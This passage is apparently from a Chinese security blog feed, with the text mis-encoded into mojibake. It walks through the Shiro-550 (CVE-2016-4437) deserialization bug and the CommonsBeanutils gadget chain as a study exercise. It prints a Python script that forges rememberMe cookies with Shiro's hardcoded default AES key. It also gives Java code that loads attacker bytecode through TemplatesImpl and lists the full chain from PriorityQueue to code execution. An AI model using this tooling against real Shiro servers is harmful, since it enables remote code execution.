çš„æˆå‘˜å˜é‡ã€‚</li><li><code>serializer</code>ï¼šShiro çš„åºåˆ—åŒ–å™¨ï¼Œç”¨æ¥å¯¹åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ ‡è¯†ç”¨æˆ·èº«ä»½çš„<code>PrincipalCollection</code>å¯¹è±¡ã€‚</li><li><code>cipherService</code>ï¼šç”¨äºæ•°æ®åŠ è§£å¯†çš„ç±»ï¼Œå®é™…ä¸Šæ˜¯<code>org.apache.shiro.crypto.AesCipherService</code>ç±»ã€‚</li></ul><p><strong>CookieRememberMeManager</strong></p><p><code>getRememberedSerializedIdentity()</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;<br><br>    <span class="hljs-comment">//å¦‚æœä¸æ˜¯ HTTP ç›¸å…³è”çš„å®ä¾‹ï¼Œè®°å½•è°ƒè¯•ä¿¡æ¯å¹¶è¿”å› null</span><br>       <span class="hljs-keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;<br>           <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>               <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a &quot;</span> +<br>                       <span class="hljs-string">&quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot;</span> +<br>                       <span class="hljs-string">&quot;immediately and ignoring rememberMe operation.&quot;</span>;<br>               log.debug(msg);<br>           &#125;<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>       &#125;<br><br>    <span class="hljs-comment">//è°ƒç”¨ isIdentityRemoved(wsc) æ–¹æ³•æ£€æŸ¥èº«ä»½æ˜¯å¦å·²ç§»é™¤ã€‚å¦‚æœå·²ç§»é™¤ï¼Œè¿”å› nullã€‚</span><br>       <span class="hljs-type">WebSubjectContext</span> <span class="hljs-variable">wsc</span> <span class="hljs-operator">=</span> (WebSubjectContext) subjectContext;<br>       <span class="hljs-keyword">if</span> (isIdentityRemoved(wsc)) &#123;<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>       &#125;<br><br>    <span class="hljs-comment">//è·å– HTTP è¯·æ±‚å’Œå“åº”å¯¹è±¡:</span><br>       <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> WebUtils.getHttpRequest(wsc);<br>       <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> WebUtils.getHttpResponse(wsc);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    è¯»å–å¹¶å¤„ç†cookie:è°ƒç”¨ getCookie().readValue(request, response) è¯»å–â€œè®°ä½æˆ‘â€cookie çš„å€¼ã€‚</span><br><span class="hljs-comment">æ£€æŸ¥ cookie æ˜¯å¦å·²è¢«åˆ é™¤ï¼ˆCookie.DELETED_COOKIE_VALUEï¼‰ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è¿”å› nullã€‚</span><br><span class="hljs-comment">å¦‚æœ cookie å­˜åœ¨ï¼Œå¯¹å…¶è¿›è¡Œ Base64 è§£ç ã€‚</span><br><span class="hljs-comment">è®°å½•è§£ç åçš„ä¿¡æ¯ï¼ˆå¦‚æœå¯ç”¨äº†è¯¦ç»†æ—¥å¿—ï¼‰ã€‚</span><br><span class="hljs-comment">è¿”å›è§£ç åçš„å­—èŠ‚æ•°ç»„ã€‚</span><br><span class="hljs-comment">*/</span><br>       <span class="hljs-type">String</span> <span class="hljs-variable">base64</span> <span class="hljs-operator">=</span> getCookie().readValue(request, response);<br>       <span class="hljs-comment">// Browsers do not always remove cookies immediately (SHIRO-183)</span><br>       <span class="hljs-comment">// ignore cookies that are scheduled for removal</span><br>       <span class="hljs-keyword">if</span> (Cookie.DELETED_COOKIE_VALUE.equals(base64)) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br><br>       <span class="hljs-keyword">if</span> (base64 != <span class="hljs-literal">null</span>) &#123;<br>           base64 = ensurePadding(base64);<br>           <span class="hljs-keyword">if</span> (log.isTraceEnabled()) &#123;<br>               log.trace(<span class="hljs-string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="hljs-string">&quot;]&quot;</span>);<br>           &#125;<br>           <span class="hljs-type">byte</span>[] decoded = Base64.decode(base64);<br>           <span class="hljs-keyword">if</span> (log.isTraceEnabled()) &#123;<br>               log.trace(<span class="hljs-string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="hljs-literal">null</span> ? decoded.length : <span class="hljs-number">0</span>) + <span class="hljs-string">&quot; bytes.&quot;</span>);<br>           &#125;<br>           <span class="hljs-keyword">return</span> decoded;<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-comment">//no cookie set - new site visitor?</span><br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="Shiro-550æ¼æ´åˆ©ç”¨"><a href="#Shiro-550æ¼æ´åˆ©ç”¨" class="headerlink" title="Shiro 550æ¼æ´åˆ©ç”¨"></a>Shiro 550æ¼æ´åˆ©ç”¨</h2><h3 id="CC11é“¾æ”»å‡»"><a href="#CC11é“¾æ”»å‡»" class="headerlink" title="CC11é“¾æ”»å‡»"></a>CC11é“¾æ”»å‡»</h3><p>å¤–éƒ¨åº“ä¸­æœ‰CC3.2.1ï¼Œæ­£å¥½æ˜¯æœ‰æ¼æ´çš„ç‰ˆæœ¬</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240611200459717.png" alt="image-20240611200459717"></p><p>åŠ å¯†è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> email.mime <span class="hljs-keyword">import</span> base<br><span class="hljs-keyword">from</span> pydoc <span class="hljs-keyword">import</span> plain<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> turtle <span class="hljs-keyword">import</span> mode<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_data</span>(<span class="hljs-params">filename</span>):<br> <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br> <span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_enc</span>(<span class="hljs-params">data</span>):<br> BS = AES.block_size<br> pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br> key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br> mode = AES.MODE_CBC<br> iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br> encryptor = AES.new(base64.b64decode(key), mode, iv)<br> ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))<br> <span class="hljs-keyword">return</span> ciphertext<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_dec</span>(<span class="hljs-params">enc_data</span>):<br> enc_data = base64.b64decode(enc_data)<br> unpad = <span class="hljs-keyword">lambda</span> s: s[:-s[-<span class="hljs-number">1</span>]]<br> key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br> mode = AES.MODE_CBC<br> iv = enc_data[:<span class="hljs-number">16</span>]<br> encryptor = AES.new(base64.b64decode(key), mode, iv)<br> plaintext = encryptor.decrypt(enc_data[<span class="hljs-number">16</span>:])<br> plaintext = unpad(plaintext)<br> <span class="hljs-keyword">return</span> plaintext<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br> data = get_file_data(<span class="hljs-string">&quot;ser.bin&quot;</span>)<br> <span class="hljs-built_in">print</span>(aes_enc(data))<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªè„šæœ¬çš„æ„æ€å°±æ˜¯å…ˆaesåŠ å¯†ï¼Œå†base64ç¼–ç ï¼Œç¬¦åˆshiroé€»è¾‘</p><p>å¯¹CC11çš„åºåˆ—åŒ–æ•°æ®ç¼–ç </p><p>å½“Cookieä¸­æœ‰JSESSIONIDæ—¶ï¼Œä¸ä¼šé€šè¿‡rememberMeçš„æ•°æ®è¿›è¡Œèº«ä»½è®¤è¯ï¼Œå°±æ‰§è¡Œä¸äº†æˆ‘ä»¬æ„é€ å¥½çš„EXP</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240611211916791.png" alt="image-20240611211916791"></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240611211931741.png" alt="image-20240611211931741"></p><h3 id="CBé“¾æ”»å‡»"><a href="#CBé“¾æ”»å‡»" class="headerlink" title="CBé“¾æ”»å‡»"></a>CBé“¾æ”»å‡»</h3><p>å› ä¸ºåŸç”Ÿçš„Shiroå¹¶ä¸å¸¦CCä¾èµ–ï¼Œä½†æ˜¯åŒ…å«äº†commons-beanutilsï¼Œæ‰€ä»¥å‚è€ƒ<a href="https://sp4rks3.github.io/2024/06/08/JAVA%E5%AE%89%E5%85%A8/CB%E9%93%BE/">Javaååºåˆ—åŒ–CommonsBeanutilsé“¾</a></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240611213742442.png" alt="image-20240611213742442"></p><p>ç”¨ä¹‹å‰çš„CBé“¾æ‰“ï¼ŒæŠ¥é”™ä¿¡æ¯ä¸º<code>org.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc serialVersionUID = -2044202215314119608, local class serialVersionUID = -3490850999041592962</code></p><p>è¿™æ˜¯å› ä¸ºCBç‰ˆæœ¬ä¸ä¸€è‡´å¯¼è‡´çš„</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240611213705631.png" alt="image-20240611213705631"></p><p>Shiroç¯å¢ƒä¸­commons-beanutilsç‰ˆæœ¬ä¸º1.8.3</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240611213801082.png" alt="image-20240611213801082"></p><p>æœ€ç®€å•çš„æ¥è§£å†³åŠæ³•å°±æ˜¯æŠŠä¹‹å‰æœ¬åœ°ç¯å¢ƒä¸­commons-beanutilsçš„ç‰ˆæœ¬å˜ä¸ºShiroçš„commons-beanutilsç‰ˆæœ¬</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240611213925075.png" alt="image-20240611213925075"></p><h2 id="å‚è€ƒè¿æ¥"><a href="#å‚è€ƒè¿æ¥" class="headerlink" title="å‚è€ƒè¿æ¥"></a>å‚è€ƒè¿æ¥</h2><p><a href="https://blog.csdn.net/qq_36551991/article/details/118031254">Shiroå­¦ä¹ ä¹‹è·¯ï¼ˆä¸€ï¼‰ï¼šShiroæ˜¯ä»€ä¹ˆï¼Ÿæœ‰ä»€ä¹ˆç”¨</a></p><p><a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Shiroååºåˆ—åŒ–æ¼æ´(ä¸€)-shiro550æµç¨‹åˆ†æ</a></p><p><a href="https://www.bilibili.com/video/BV1dq4y1B76x/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Shiroååºåˆ—åŒ–æ¼æ´(äºŒ)-shiroä¸‹çš„CCé“¾åˆ©ç”¨</a></p><p><a href="https://www.bilibili.com/video/BV1uf4y1T7Rq/?spm_id_from=333.788&vd_source=d195054a6a081ba07486dcc86c6ba707">Shiroååºåˆ—åŒ–æ¼æ´(ä¸‰)-shiroæ— ä¾èµ–åˆ©ç”¨é“¾</a></p><p><a href="https://github.com/dota-st/JavaSec/blob/master/04-Shiro%E4%B8%93%E5%8C%BA/1-Shiro%E4%B9%8BCVE-2016-4437/index.md">CVE-2016-4437æ¼æ´åˆ†æ</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVAå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaååºåˆ—åŒ–CommonsBeanutilsé“¾</title>
    <link href="/2024/06/08/JAVA%E5%AE%89%E5%85%A8/CB%E9%93%BE/"/>
    <url>/2024/06/08/JAVA%E5%AE%89%E5%85%A8/CB%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><code> CommonsBeanutils</code>å±äº<code>Apache Commons </code>å·¥å…·é›†ä¸‹çš„ä¸€ä¸ªé¡¹ç›®ï¼Œå®ƒå’Œ<code>Commons-Collections</code>å¾ˆåƒï¼Œä¹Ÿæ˜¯å¯¹JAVAå†…ç½®åŠŸèƒ½çš„åŠ å¼ºï¼ŒCCæ˜¯å¯¹JAVAé›†åˆç±»çš„å¢å¼ºï¼ŒCBæ˜¯å¯¹<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">JavaBean</a>çš„åŠ å¼ºã€‚</p><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shello">&lt;dependencies&gt;<br>       &lt;dependency&gt;<br>           &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;<br>           &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;<br>           &lt;version&gt;1.9.2&lt;/version&gt;<br>       &lt;/dependency&gt;<br> &lt;dependencies&gt;      <br></code></pre></td></tr></table></figure><h3 id="getterå’Œsetter"><a href="#getterå’Œsetter" class="headerlink" title="getterå’Œsetter"></a>getterå’Œsetter</h3><p>æ¥ç€æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹å®é™…çš„äº†è§£ä¸€ä¸‹ï¼Œä¸‹é¢ä»£ç å®šä¹‰äº†ä¸€ä¸ª Personç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name=<span class="hljs-string">&quot;Sp4rks3&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨è¯¥ç±»ä¸­ï¼Œå®šä¹‰äº†ä¸€ä¸ªç§æœ‰å±æ€§<code>name</code>å’Œä¸¤ä¸ªæ–¹æ³•ï¼šè¯»å–<code>name</code>å’Œè®¾ç½®<code>name</code>ã€‚åœ¨ Java ä¸­ï¼Œæˆ‘ä»¬æŠŠç¬¦åˆé©¼å³°å¼å‘½åæ³•ï¼Œä»¥ get å¼€å¤´çš„æ–¹æ³•åå«åš<code>getter</code>ï¼Œä»¥ set å¼€å¤´çš„æ–¹æ³•åå«åš<code>setter</code>ã€‚</p><p><code>CommonsBeanutils</code>ä¸ºå¼€å‘äººå‘˜æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³•ï¼š<code>PropertyUtils.getProperty()</code>ï¼Œé€šè¿‡è¯¥æ–¹æ³•å¯ä»¥è°ƒç”¨ä»»æ„<code>JavaBean</code>ä¸­çš„<code>getter()</code>æ–¹æ³•ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹ä»£ç è°ƒç”¨ User ç±»çš„<code>getName()</code>æ–¹æ³•è·å– username çš„å€¼ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(PropertyUtils.getProperty(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(),<span class="hljs-string">&quot;name&quot;</span>));<br></code></pre></td></tr></table></figure><p>ç›¸å½“äºæˆ‘ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒå°±ä¼šåŠ¨æ€çš„æ‰§è¡Œå‡½æ•°ï¼Œè¿™æ ·å°±ä¼šè®©æˆ‘ä»¬æƒ³åˆ°ä¼šä¸ä¼šæœ‰å®‰å…¨é—®é¢˜</p><hr><p><img src="https://image.sp4rks.xyz/2024/06/2024-06-07%20104831.png" alt="2024-06-07 104831"></p><p>æˆ‘ä»¬ä¼ å…¥çš„æ˜¯ <code>name</code>ï¼Œä½†æ˜¯è¿”å›çš„æ˜¯getteæ–¹æ³•å’Œsetteræ–¹æ³•çš„åå­— è¿˜è¿”å›äº†Beançš„å±æ€§å€¼çš„åå­—ã€‚</p><p>(å¤§å†™çš„<code>Name</code>ï¼Œå®é™…æ˜¯<code>javabean</code>çš„é»˜è®¤æ ¼å¼ï¼Œå°±æ˜¯ä¼ è¿›æ¥å°å†™ï¼Œä½†æ˜¯ä¼šå°†ç¬¬ä¸€ä¸ªå­—æ¯å˜ä¸ºå¤§å†™ï¼Œå˜ä¸º<code>Name</code>)</p><hr><p><code>PropertyUtilsBean</code>ä¸­çœ‹åˆ°äº†è°ƒç”¨çš„åœ°æ–¹ï¼Œæ„æ€å°±æ˜¯å¯¹æˆ‘ä»¬ä¼ é€’çš„å¯¹è±¡ï¼Œè°ƒç”¨ä¸€ä¸ªç¬¦åˆJavaBeançš„æ–¹æ³•(getteræ–¹æ³•)</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240606214037301.png" alt="image-20240606214037301"></p><h2 id="CommonsBeanUtilsåˆ©ç”¨é“¾åˆ†æ"><a href="#CommonsBeanUtilsåˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="CommonsBeanUtilsåˆ©ç”¨é“¾åˆ†æ"></a>CommonsBeanUtilsåˆ©ç”¨é“¾åˆ†æ</h2><p>CC3ä¸­æåˆ°äº†<code>Templateslmpl</code>ç±»ï¼Œå®ƒé‡Œé¢æœ‰<code>getOutputProperties()</code>æ–¹æ³•,è€Œ<code>getOutputProperties()</code>åå­—æ­£å¥½æ»¡è¶³getteræ–¹æ³•çš„å®šä¹‰ä¸”<code>newTransformer()</code>æ˜¯å¯ä»¥åŠ¨æ€åŠ è½½ç±»çš„</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240606214356953.png" alt="image-20240606214356953"></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240606214757835.png" alt="image-20240606214757835"></p><h3 id="TemplatesImplè°ƒç”¨é“¾"><a href="#TemplatesImplè°ƒç”¨é“¾" class="headerlink" title="TemplatesImplè°ƒç”¨é“¾"></a>TemplatesImplè°ƒç”¨é“¾</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">TemplatesImpl#</span><span class="language-bash">getOutputProperties() -&gt; TemplatesImpl<span class="hljs-comment">#newTransformer() -&gt;</span></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">TemplatesImpl#</span><span class="language-bash">getTransletInstance() -&gt; TemplatesImpl<span class="hljs-comment">#defineTransletClasses()</span></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash">TransletClassLoader<span class="hljs-comment">#defineClass()</span></span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥<code>PropertyUtils.getProperty(o1, property)</code>è¿™æ®µä»£ç ï¼Œå½“o1æ˜¯ä¸€ä¸ª <code>TemplatesImpl</code>å¯¹ è±¡ï¼Œè€Œ property çš„å€¼ä¸º<code>outputProperties</code>æ—¶ï¼Œå°†ä¼šè‡ªåŠ¨è°ƒç”¨getterï¼Œä¹Ÿå°±æ˜¯ <code>TemplatesImpl.getOutputProperties()</code>æ–¹æ³•ï¼Œè§¦å‘ä»£ç æ‰§è¡Œã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240606220701527.png" alt="image-20240606220701527"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.System.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">//TemplatesImpl3åæ®µä»£ç æ‰§è¡Œéƒ¨åˆ†</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        PropertyUtils.getProperty(templates,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ç€å°±æ˜¯æ‰¾åœ¨å“ªè°ƒç”¨äº†<code>getProperty()</code>,åœ¨<code>BeanComparator.compare()</code>ä¸­æ‰¾åˆ°äº†è°ƒç”¨<code>getProperty()</code>çš„åœ°æ–¹</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240607184303226.png" alt="image-20240607184303226"></p><p><code>compare()</code>æˆ‘ä»¬ä¹Ÿå¾ˆç†Ÿæ‚‰äº†ï¼Œåœ¨<a href="https://sp4rks3.github.io/2024/06/01/JAVA%E5%AE%89%E5%85%A8/CC4/">Javaååºåˆ—åŒ–CommonsCollectionsç¯‡-CC4</a>æœ‰æåˆ°compareï¼Œcompareçš„æ–¹æ³•è°ƒç”¨æ˜¯è¿™æ ·çš„</p><p><img src="https://image.sp4rks.xyz/2024/06/6.png" alt="6"></p><h3 id="é“¾å­æµç¨‹"><a href="#é“¾å­æµç¨‹" class="headerlink" title="é“¾å­æµç¨‹"></a>é“¾å­æµç¨‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">PriorityQueue.readObject()<br>PriorityQueue.heapify()<br>PriorityQueue.siftDown()<br>PriorityQueue.siftDownUsingComparator()<br>BeanComparator.compare()<br>PropertyUtils.getProperty(TemplatesImpl, outputProperties)<br>    <br>TemplatesImpl.getOutputProperties()<br>TemplatesImpl.newTransformer()<br>TemplatesImpl.getTransletInstance()<br>TemplatesImpl.defineTransletClasses()<br></code></pre></td></tr></table></figure><p><img src="https://image.sp4rks.xyz/2024/06/CB1.png" alt="CB1"></p><h2 id="CommonsBeanUtilsé“¾å®ç°"><a href="#CommonsBeanUtilsé“¾å®ç°" class="headerlink" title="CommonsBeanUtilsé“¾å®ç°"></a>CommonsBeanUtilsé“¾å®ç°</h2><p>å°è¯•æŒ‰ç…§ä¸Šé¢çš„é€»è¾‘å†™</p><h3 id="æœªæ‰¾åˆ°æ–¹æ³•çš„é”™è¯¯"><a href="#æœªæ‰¾åˆ°æ–¹æ³•çš„é”™è¯¯" class="headerlink" title="æœªæ‰¾åˆ°æ–¹æ³•çš„é”™è¯¯"></a>æœªæ‰¾åˆ°æ–¹æ³•çš„é”™è¯¯</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 